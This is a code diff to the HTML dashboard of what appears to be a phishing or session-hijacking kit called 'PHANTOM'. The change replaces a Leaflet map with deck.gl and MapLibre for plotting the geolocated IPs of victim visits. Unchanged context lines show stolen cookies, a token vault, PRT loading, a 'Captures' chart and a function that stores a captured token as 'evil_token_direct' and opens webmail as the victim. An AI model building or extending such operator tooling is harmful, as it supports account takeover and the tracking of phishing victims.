@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PHANTOM Dashboard</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://unpkg.com/deck.gl@9.0/dist.min.js"></script>
+    <script src="https://unpkg.com/maplibre-gl@4.5.0/dist/maplibre-gl.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/maplibre-gl@4.5.0/dist/maplibre-gl.css" />
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap');
 
@@ -45,15 +47,11 @@
         }
         body.light-glass .header h1 {
             background: linear-gradient(135deg, #4a2c8a, #2a5f8a);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
         }
         body.light-glass .stat-card .value {
             background: linear-gradient(135deg, #1a1f2a, #3a4f6a);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
         }
         body.light-glass .stat-card label,
         body.light-glass .stat-card .sub { color: rgba(0, 0, 0, 0.6); }
@@ -63,31 +61,24 @@
         body.light-glass .action-btn.cookie { border-color: rgba(200, 150, 0, 0.3); color: #b8860b; }
         body.light-glass .toolbar input,
         body.light-glass .toolbar select {
-            background: rgba(255, 255, 255, 0.3);
-            border-color: rgba(0, 0, 0, 0.1);
-            color: #1a1f2a;
+            background: rgba(255, 255, 255, 0.3); border-color: rgba(0, 0, 0, 0.1); color: #1a1f2a;
         }
         body.light-glass .toolbar input::placeholder { color: rgba(0, 0, 0, 0.4); }
         body.light-glass .toolbar input:focus,
         body.light-glass .toolbar select:focus {
-            border-color: #7c4dff;
-            box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2);
+            border-color: #7c4dff; box-shadow: 0 0 0 3px rgba(124, 77, 255, 0.2);
         }
         body.light-glass .toolbar select option { background: #f0f4ff; color: #1a1f2a; }
         body.light-glass .btn { color: #1a1f2a; border-color: rgba(0, 0, 0, 0.1); background: rgba(255, 255, 255, 0.2); }
         body.light-glass .btn:hover { background: rgba(255, 255, 255, 0.4); }
         body.light-glass .btn-primary {
-            background: linear-gradient(135deg, #536dfe, #7c4dff);
-            color: #fff;
-            border-color: transparent;
+            background: linear-gradient(135deg, #536dfe, #7c4dff); color: #fff; border-color: transparent;
         }
         body.light-glass .btn-primary:hover { background: linear-gradient(135deg, #6a7ffc, #9464ff); }
         body.light-glass .btn-gold { border-color: rgba(180, 130, 0, 0.4); color: #8b6914; }
         body.light-glass .btn-gold:hover { background: rgba(180, 130, 0, 0.1); }
         body.light-glass .modal-content {
-            background: rgba(255, 255, 255, 0.3);
-            backdrop-filter: blur(20px);
-            border-color: rgba(255, 255, 255, 0.4);
+            background: rgba(255, 255, 255, 0.3); backdrop-filter: blur(20px); border-color: rgba(255, 255, 255, 0.4);
         }
         body.light-glass .modal pre { background: rgba(0, 0, 0, 0.05); border-color: rgba(0, 0, 0, 0.1); }
         body.light-glass .toast { background: rgba(255, 255, 255, 0.9); color: #1a1f2a; border-color: rgba(0, 0, 0, 0.1); }
@@ -96,12 +87,8 @@
         body.light-glass .tab { color: rgba(0,0,0,0.4); background: rgba(0,0,0,0.02); border-color: rgba(0,0,0,0.05); }
         body.light-glass .tab:hover { color: rgba(0,0,0,0.7); }
         body.light-glass .tab.active { background: rgba(124,77,255,0.15); border-color: rgba(124,77,255,0.2); color: #4a2c8a; }
-        body.light-glass .leaflet-control-zoom a { background: rgba(255, 255, 255, 0.3) !important; color: #1a1f2a !important; border-color: rgba(0, 0, 0, 0.1) !important; }
-        body.light-glass .leaflet-popup-content-wrapper { background: rgba(255, 255, 255, 0.9) !important; color: #1a1f2a !important; border-color: rgba(0, 0, 0, 0.1) !important; }
 
-        .tabs {
-            display: flex; gap: 4px; padding: 4px; margin-bottom: 24px; overflow-x: auto;
-        }
+        .tabs { display: flex; gap: 4px; padding: 4px; margin-bottom: 24px; overflow-x: auto; }
         .tab {
             padding: 10px 24px; border-radius: 40px; cursor: pointer; font-size: 14px; font-weight: 500;
             transition: all 0.2s; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05);
@@ -176,9 +163,14 @@
         .action-btn.cookie:hover { background: rgba(255, 215, 0, 0.08); border-color: #ffd700; }
 
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
-        .map-container { height: 300px; border-radius: 20px; overflow: hidden; background: rgba(0, 0, 0, 0.3); }
-        #map { height: 100%; width: 100%; background: transparent; }
-        .chart-container { height: 300px; padding: 16px; }
+        .map-container {
+            height: 320px; border-radius: 20px; overflow: hidden; background: rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+        #map { height: 100%; width: 100%; }
+        #deckgl-wrapper { height: 100% !important; width: 100% !important; }
+        #deckgl-wrapper canvas { border-radius: 20px; }
+        .chart-container { height: 320px; padding: 16px; }
         .chart-container canvas { width: 100% !important; height: 100% !important; }
 
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(12px); z-index: 2000; justify-content: center; align-items: center; }
@@ -199,9 +191,6 @@
             .tabs { gap: 2px; }
             .tab { padding: 6px 14px; font-size: 12px; }
         }
-
-        .leaflet-control-zoom a { background: rgba(255, 255, 255, 0.08) !important; color: #e0e8f0 !important; border-color: rgba(255, 255, 255, 0.1) !important; }
-        .leaflet-popup-content-wrapper { background: rgba(20, 25, 35, 0.9) !important; backdrop-filter: blur(12px) !important; color: #e0e8f0 !important; border: 1px solid rgba(255, 255, 255, 0.05) !important; }
     </style>
 </head>
 <body>
@@ -329,20 +318,25 @@
 </div>
 <div id="toastContainer"></div>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
     // =============================================
     // GLOBALS
     // =============================================
-    let allLogs = []; let map = null; let chart = null; let analyticsChart = null;
+    let allLogs = []; let chart = null; let analyticsChart = null;
     let reconnectAttempts = 0; const maxReconnectAttempts = 20; let ws;
     let vaultTokens = []; let deviceHistory = []; let deviceInterval;
-    let mapMarkers = [];
+    let deckgl = null; let maplibreMap = null;
 
     function toggleTheme() {
         document.body.classList.toggle('light-glass');
         const isLight = document.body.classList.contains('light-glass');
         localStorage.setItem('theme', isLight ? 'light' : 'dark');
+        if (maplibreMap) {
+            const style = isLight
+                ? 'https://basemaps.cartocdn.com/gl/positron-gl-style/style.json'
+                : 'https://basemaps.cartocdn.com/gl/dark-matter-gl-style/style.json';
+            maplibreMap.setStyle(style);
+        }
     }
     (function restoreTheme() {
         if (localStorage.getItem('theme') === 'light') document.body.classList.add('light-glass');
@@ -353,6 +347,7 @@
         document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
         document.getElementById('tab-' + tabId).classList.add('active');
         document.querySelector(`.tab[data-tab="${tabId}"]`).classList.add('active');
+        if (tabId === 'dashboard') { setTimeout(() => { if (maplibreMap) maplibreMap.resize(); if (deckgl) deckgl.resize(); }, 100); }
         if (tabId === 'vault') loadVault();
         if (tabId === 'prt') loadPRTs();
         if (tabId === 'analytics') loadAnalytics();
@@ -396,6 +391,161 @@
         if (!token) { showToast('❌ No token available', true); return; }
         localStorage.setItem('evil_token_direct', token); localStorage.setItem('evil_token_user', username);
         window.open('/webmail', '_blank'); showToast(`📧 Opening webmail for ${username}...`);
+    }
+
+    // =============================================
+    // 🗺️ DECK.GL + MAPLIBRE MAP
+    // =============================================
+    const { DeckGL, ScatterplotLayer, GeoJsonLayer, ArcLayer } = deck;
+
+    function initMap() {
+        maplibreMap = new maplibregl.Map({
+            container: 'map',
+            style: document.body.classList.contains('light-glass')
+                ? 'https://basemaps.cartocdn.com/gl/positron-gl-style/style.json'
+                : 'https://basemaps.cartocdn.com/gl/dark-matter-gl-style/style.json',
+            center: [0, 20],
+            zoom: 1.5,
+            attributionControl: false
+        });
+        maplibreMap.addControl(new maplibregl.NavigationControl(), 'bottom-right');
+    }
+
+    async function updateMapWithVisits() {
+        if (!maplibreMap) initMap();
+
+        try {
+            const res = await fetch('/dash/api/visits');
+            const data = await res.json();
+            if (!data.visits?.length) return;
+
+            const uniqueIPs = [...new Set(data.visits.map(v => v.ip).filter(ip => ip !== 'Unknown'))];
+            const locations = [];
+            for (const ip of uniqueIPs.slice(0, 50)) {
+                const loc = await getIPLocation(ip);
+                if (loc?.lat && loc?.lon) locations.push({ ip, ...loc });
+            }
+
+            const scatterData = locations.map((loc, i) => ({
+                position: [loc.lon, loc.lat],
+                radius: 30000,
+                ip: loc.ip,
+                city: loc.city,
+                country: loc.country,
+                index: i
+            }));
+
+            // Arc data — draw lines from each point to a central hub
+            const arcData = [];
+            const centerPoint = locations.length > 0
+                ? [locations.reduce((s, l) => s + l.lon, 0) / locations.length,
+                   locations.reduce((s, l) => s + l.lat, 0) / locations.length]
+                : [0, 20];
+
+            locations.forEach((loc, i) => {
+                arcData.push({
+                    sourcePosition: [loc.lon, loc.lat],
+                    targetPosition: centerPoint,
+                    index: i
+                });
+            });
+
+            const scatterplotLayer = new ScatterplotLayer({
+                id: 'visitor-dots',
+                data: scatterData,
+                pickable: true,
+                opacity: 0.9,
+                stroked: true,
+                filled: true,
+                radiusScale: 1,
+                radiusMinPixels: 6,
+                radiusMaxPixels: 30,
+                lineWidthMinPixels: 2,
+                getPosition: d => d.position,
+                getRadius: d => d.radius,
+                getFillColor: d => [130, 177, 255, 220],
+                getLineColor: d => [83, 109, 254, 255],
+                onHover: ({ object }) => {
+                    const canvas = document.getElementById('map');
+                    if (canvas) canvas.style.cursor = object ? 'pointer' : '';
+                }
+            });
+
+            const glowLayer = new ScatterplotLayer({
+                id: 'visitor-glow',
+                data: scatterData,
+                pickable: false,
+                opacity: 0.12,
+                stroked: false,
+                filled: true,
+                radiusScale: 1,
+                radiusMinPixels: 25,
+                radiusMaxPixels: 80,
+                getPosition: d => d.position,
+                getRadius: d => d.radius * 3,
+                getFillColor: d => [130, 177, 255, 40]
+            });
+
+            const arcLayer = new ArcLayer({
+                id: 'visitor-arcs',
+                data: arcData,
+                pickable: false,
+                getWidth: 1,
+                getSourcePosition: d => d.sourcePosition,
+                getTargetPosition: d => d.targetPosition,
+                getSourceColor: d => [130, 177, 255, 60],
+                getTargetColor: d => [83, 109, 254, 120],
+                widthMinPixels: 0.5,
+                widthMaxPixels: 2
+            });
+
+            if (deckgl) {
+                deckgl.setProps({ layers: [glowLayer, arcLayer, scatterplotLayer] });
+            } else {
+                deckgl = new DeckGL({
+                    container: 'map',
+                    initialViewState: {
+                        longitude: centerPoint[0],
+                        latitude: centerPoint[1],
+                        zoom: 2,
+                        pitch: 30,
+                        bearing: 0
+                    },
+                    controller: true,
+                    layers: [glowLayer, arcLayer, scatterplotLayer],
+                    onViewStateChange: ({ viewState }) => {
+                        if (maplibreMap) {
+                            maplibreMap.jumpTo({
+                                center: [viewState.longitude, viewState.latitude],
+                                zoom: viewState.zoom,
+                                bearing: viewState.bearing,
+                                pitch: viewState.pitch
+                            });
+                        }
+                    },
+                    getTooltip: ({ object }) => {
+                        if (!object) return null;
+                        return {
+                            html: `<div style="font-family:Inter,sans-serif;padding:8px 12px;background:rgba(20,25,35,0.95);border-radius:8px;color:#e0e8f0;border:1px solid rgba(255,255,255,0.1);backdrop-filter:blur(12px);">
+                                <b>IP:</b> ${object.ip}<br><b>Location:</b> ${object.city}, ${object.country}
+                            </div>`,
+                            style: { background: 'none', border: 'none', padding: 0 }
+                        };
+                    }
+                });
+            }
+
+            // Fit bounds on MapLibre
+            if (locations.length > 0) {
+                const bounds = new maplibregl.LngLatBounds();
+                locations.forEach(l => bounds.extend([l.lon, l.lat]));
+                maplibreMap.fitBounds(bounds, { padding: 60, maxZoom: 8 });
+            }
+
+        } catch (e) {
+            console.error('Deck.gl map error:', e);
+            if (!maplibreMap) initMap();
+        }
     }
 
     // =============================================
@@ -461,19 +611,6 @@
         logs.forEach(log => { const d = new Date(log.modified).toDateString(); if (days.hasOwnProperty(d)) days[d]++; });
         if (chart) chart.destroy();
         chart = new Chart(ctx, { type: 'bar', data: { labels: Object.keys(days), datasets: [{ label: 'Captures', data: Object.values(days), backgroundColor: 'rgba(130, 177, 255, 0.4)', borderColor: '#82b1ff', borderWidth: 2, borderRadius: 8 }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { labels: { color: '#a0b0c0' } } }, scales: { y: { beginAtZero: true, ticks: { color: '#a0b0c0' }, grid: { color: 'rgba(255,255,255,0.05)' } }, x: { ticks: { color: '#a0b0c0' }, grid: { display: false } } } } });
-    }
-
-    async function updateMapWithVisits() {
-        try {
-            const res = await fetch('/dash/api/visits'); const data = await res.json();
-            if (!data.visits?.length) { if (!map) { map = L.map('map').setView([20, 0], 2); L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, &copy; CartoDB' }).addTo(map); } return; }
-            const uniqueIPs = [...new Set(data.visits.map(v => v.ip).filter(ip => ip !== 'Unknown'))];
-            const locations = []; for (const ip of uniqueIPs.slice(0, 20)) { const loc = await getIPLocation(ip); if (loc) locations.push({ ip, ...loc }); }
-            if (!map) { map = L.map('map').setView([20, 0], 2); L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, &copy; CartoDB' }).addTo(map); }
-            mapMarkers.forEach(m => map.removeLayer(m)); mapMarkers = [];
-            locations.forEach(loc => { if (loc.lat && loc.lon) { const marker = L.circleMarker([loc.lat, loc.lon], { radius: 8, fillColor: '#82b1ff', color: '#536dfe', weight: 2, opacity: 0.8, fillOpacity: 0.6 }).addTo(map); marker.bindPopup(`<b>IP:</b> ${loc.ip}<br><b>Location:</b> ${loc.city}, ${loc.country}`); mapMarkers.push(marker); } });
-            if (locations.length > 0) { const bounds = L.latLngBounds(locations.filter(l => l.lat && l.lon).map(l => [l.lat, l.lon])); if (bounds.isValid()) map.fitBounds(bounds, { padding: [50, 50] }); }
-        } catch (e) { console.error('Map error:', e); }
     }
 
     async function fetchVisits() {
@@ -547,7 +684,6 @@
     // INIT
     // =============================================
     connectWebSocket(); refreshLogs(); setInterval(refreshLogs, 15000);
-    window.addEventListener('load', () => { if (!map) { map = L.map('map').setView([20, 0], 2); L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { attribution: '&copy; OpenStreetMap, &copy; CartoDB' }).addTo(map); } });
 </script>
 </body>
 </html>
